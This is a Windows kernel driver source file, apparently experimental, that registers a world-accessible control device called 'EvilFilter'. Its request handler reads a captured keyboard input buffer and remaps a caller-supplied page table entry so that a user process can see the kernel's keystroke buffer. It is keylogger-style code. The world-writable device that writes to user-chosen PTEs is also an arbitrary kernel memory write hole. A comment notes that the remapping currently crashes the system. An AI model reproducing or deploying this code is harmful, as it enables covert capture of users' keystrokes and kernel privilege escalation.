#include <ntddk.h>
#include <wdf.h>
//#include <ntddkbd.h>   
#include <ControlDevice.h>
#include <PageTableManipulation.h>
#include <SharedHeader.h>

WDFDEVICE ControlDevice;
extern PKEYBOARD_INPUT_DATA keyboardBuffer;



/*
NTSTATUS ObReferenceObjectByHandle(
_In_       HANDLE Handle,
_In_       ACCESS_MASK DesiredAccess,
_In_opt_   POBJECT_TYPE ObjectType,
_In_       KPROCESSOR_MODE AccessMode,
_Out_      PVOID *Object,
_Out_opt_  POBJECT_HANDLE_INFORMATION HandleInformation
);*/


/** /
VOID play(HANDLE handle) {

	NTSTATUS status;
	extern POBJECT_TYPE  *PsProcessType;
	PEPROCESS peProcess;
	POBJECT_TYPE peProcessObjectType = ObGetObjectType(peProcess);

	status = ObReferenceObjectByHandle(handle, GENERIC_READ, NULL, UserMode, &peProcess, NULL);


}


VOID play2() {
	PEPROCESS peProcess = IoGetCurrentProcess();
	IoGetProcessId 

}
/**/

VOID PrintPteData(PVOID VirtualAddress) {

	PVOID PDEaddress = (((ULONG)VirtualAddress >> 20) & (~0x3)) + 0xC0300000;
	PVOID PTEaddress = (((ULONG)VirtualAddress >> 10) & (~0x3)) + 0xC0000000;

	//PPTE ppte = GetPteAddress(VirtualAddress);
	//ULONG pfa = GetPhysicalFrameAddress(ppte);

	KdPrint((" PDE/PTE are [0x%lx] [0x%lx] [0x%lx]\n", PDEaddress, PTEaddress));


}



NTSTATUS CreateControlDevice(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath) {
	KdPrint(("CreateControlDevice IRQ Level [%u]", KeGetCurrentIrql()));

	NTSTATUS status;
	PWDFDEVICE_INIT ControlDeviceInit;
	WDF_OBJECT_ATTRIBUTES ControlDeviceAttributes;
	WDFDRIVER Driver;
	WDF_DRIVER_CONFIG       DriverConfig;
	WDF_IO_QUEUE_CONFIG         ioQueueConfig;
	WDFQUEUE                    queue;

	WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&ControlDeviceAttributes, CONTROL_DEVICE_EXTENSION);
	WDF_DRIVER_CONFIG_INIT(&DriverConfig, WDF_NO_EVENT_CALLBACK);

	//WDF_OBJECT_ATTRIBUTES_INIT(&Attributes);
	// TODO: Attributes.EvtCleanupCallback = EvtDriverContextCleanup;

	status = WdfDriverCreate(DriverObject, RegistryPath, &ControlDeviceAttributes, &DriverConfig, &Driver);

	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfDriverCreate FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfDriverCreate Succeededx\n"));
	}

	ControlDeviceInit = WdfControlDeviceInitAllocate(Driver, &SDDL_DEVOBJ_SYS_ALL_ADM_RWX_WORLD_RWX_RES_RWX);

	DECLARE_CONST_UNICODE_STRING(ntDeviceName, L"\\Device\\EvilFilter");
	DECLARE_CONST_UNICODE_STRING(symbolicLinkName, L"\\DosDevices\\EvilFilter");

	status = WdfDeviceInitAssignName(ControlDeviceInit, &ntDeviceName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfDeviceInitAssignName FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfDeviceInitAssignName Succeeded\n"));
	}

	//WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&ControlDeviceAttributes, CONTROL_DEVICE_EXTENSION);
	status = WdfDeviceCreate(&ControlDeviceInit, &ControlDeviceAttributes, &ControlDevice);
	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfDeviceCreate FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfDeviceCreate Succeeded\n"));
	}

	status = WdfDeviceCreateSymbolicLink(ControlDevice, &symbolicLinkName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfDeviceCreateSymbolicLink FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfDeviceCreateSymbolicLink Succeeded\n"));
	}

	WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&ioQueueConfig, WdfIoQueueDispatchSequential);
	ioQueueConfig.DefaultQueue = TRUE;
	ioQueueConfig.EvtIoDefault = ReadKeyboardBuffer;
	status = WdfIoQueueCreate(ControlDevice, &ioQueueConfig, WDF_NO_OBJECT_ATTRIBUTES, &queue); // pointer to default queue

	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfIoQueueCreate FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfIoQueueCreate Succeeded\n"));
	}
	WdfControlFinishInitializing(ControlDevice);

	KdPrint(("WdfControlFinishInitializing finished\n"));

	return status;
	// ControlDevice
}

_Use_decl_annotations_
VOID ReadKeyboardBuffer(_In_ WDFQUEUE Queue, _In_ WDFREQUEST Request) {

	UNREFERENCED_PARAMETER(Queue);

	KdPrint(("ReadKeyboardBuffer IRQ Level [%u]\n", KeGetCurrentIrql()));

	NTSTATUS                  status;
	//	WDF_REQUEST_PARAMETERS    params;
	WDFMEMORY memoryHandle;
	//PVOID memoryPointer;
	size_t Length;

	//WDF_REQUEST_PARAMETERS_INIT(&params);
	//WdfRequestGetParameters(Request, &params);
	if (keyboardBuffer) {



		/** /
		PVOID mappedBuffer = MmGetSystemAddressForMdlSafe(keyboardBuffer, NormalPagePriority);
		if (mappedBuffer) {

			KdPrint(("MmGetSystemAddressForMdlSafe success :-)))) \n"));
			PMDL mdl = NULL;
			WdfRequestRetrieveOutputWdmMdl(Request, &mdl);
			mdl->



		}
		else {

			KdPrint(("MmGetSystemAddressForMdlSafe FAILED :-( \n"));
		}
		/**/



		Length = sizeof(SHARED_MEMORY_STRUCT);

		WDF_OBJECT_ATTRIBUTES  attributes;
		WDF_OBJECT_ATTRIBUTES_INIT(&attributes);


		status = WdfRequestRetrieveOutputMemory(Request, &memoryHandle);
		//status = WdfMemoryCreate(&attributes, NonPagedPool, 0, Length, &memoryHandle, &memoryPointer);
		

		if (!NT_SUCCESS(status)) {
			KdPrint(("ReadKeyboardBuffer Could not create memory buffer 0x%x\n", status));
			WdfVerifierDbgBreakPoint();
			WdfRequestCompleteWithInformation(Request, status, 0L);
			return;
		}
		else {
			KdPrint(("ReadKeyboardBuffer memory buffer created.\n"));
		}

		PSHARED_MEMORY_STRUCT userSharedMemory = (PSHARED_MEMORY_STRUCT)WdfMemoryGetBuffer(memoryHandle, NULL);
		if (!(userSharedMemory)) {
			KdPrint(("ReadKeyboardBuffer WdfMemoryGetBuffer failed:\n"));
			WdfVerifierDbgBreakPoint();
			WdfRequestCompleteWithInformation(Request, status, 0L);
			return;
		}
		else {


			HANDLE clientProcessHandle = userSharedMemory->ClientProcessHandle;
			PVOID  clientMemory = userSharedMemory->ClientMemory;
			PPTE clientPpte = userSharedMemory->PageTable;

			if (clientPpte) {
				KdPrint(("ReadKeyboardBuffer userPageTable is [0x%lx] [0x%lx]\n", clientMemory, clientPpte));

				KdPrint(("ReadKeyboardBuffer Client instruction is [%c]\n", userSharedMemory->instruction));


				ULONG pageDirectoryIndex = (ULONG)clientMemory >> 21;
				ULONG pageTableIndex = (ULONG)clientMemory >> 12 & 0x01FF;
				ULONG clientOffset = (ULONG)clientMemory & 0x0fff;

				ULONG clientPageFrameNumber = clientPpte->PageFrameNumber;
				ULONG clientBaseAddress     = clientPageFrameNumber << 12;
				ULONG finalPhysicalAddress  = clientBaseAddress + clientOffset;

				KdPrint(("ReadKeyboardBuffer Client Buffer Address is [0x%lx]\n", finalPhysicalAddress));

				PPTE  kmdfPpte = GetPteAddress(keyboardBuffer);
				ULONG kmdfPageFrameNumber = kmdfPpte->PageFrameNumber;
				ULONG kmdfBaseAddress = kmdfPageFrameNumber << 12;
				ULONG kmdfOffset = (ULONG)keyboardBuffer & 0x0fff;



				ULONG newClinetBaseAddress = kmdfBaseAddress + kmdfOffset - clientOffset;
				ULONG newClientPageFrameNumber = newClinetBaseAddress >> 12;


				KdPrint(("ReadKeyboardBuffer client is [0x%lx] [0x%lx] [0x%lx]\n", clientBaseAddress, clientPageFrameNumber, clientOffset));
				KdPrint(("ReadKeyboardBuffer kmdf   is [0x%lx] [0x%lx] [0x%lx]\n", kmdfBaseAddress, kmdfPageFrameNumber, kmdfOffset));
				KdPrint(("ReadKeyboardBuffer NEW    is [0x%lx] [0x%lx] [0x%lx]\n", newClinetBaseAddress, newClientPageFrameNumber, clientOffset));

				if (userSharedMemory->instruction == 'O') {
					KdPrint(("Sending offset to user\n"));
					userSharedMemory->offset = kmdfOffset;
				}
				else if (userSharedMemory->instruction == 'E') {

					KdPrint(("KMDF   PTE [0x%lx] [0x%lx]\n", kmdfPpte, *kmdfPpte));
					KdPrint(("client PTE [0x%lx] [0x%lx]\n", clientPpte, *clientPpte));


					ULONG kmdfPfnValue = kmdfPpte->rawValue & ~(0xfff);
					ULONG clientPfnValue = clientPpte->rawValue & ~(0xfff);


					(*((PULONG)clientPpte)) &= ~(1 << 2);  // clear owner
					(*((PULONG)clientPpte)) |= 0x100; // set global
					(*((PULONG)clientPpte)) |= 0x200; // set copy on write
					// This line right here gived a BSOD with the error MEMORY_MANAGEMENT
					(*((PULONG)clientPpte)) ^= (kmdfPfnValue ^ clientPfnValue);
					KdPrint(("Replace physical address success\n"));
					KdPrint(("KMDF   PTE [0x%lx] [0x%lx]\n", kmdfPpte, *kmdfPpte));
					KdPrint(("client PTE [0x%lx] [0x%lx]\n", clientPpte, *clientPpte));

				}


			}
			else {
				KdPrint(("ReadKeyboardBuffer userPageTable is NULL\n"));
			}
		}

	}
	else {
		KdPrint(("keyboardBuffer not yet set....plz wait\n"));
		Length = 0;
		status = STATUS_RESOURCE_DATA_NOT_FOUND;
	}
	// Set transfer information
	WdfRequestSetInformation(Request, (ULONG_PTR)Length);
	WdfRequestComplete(Request, status);
	return;

}
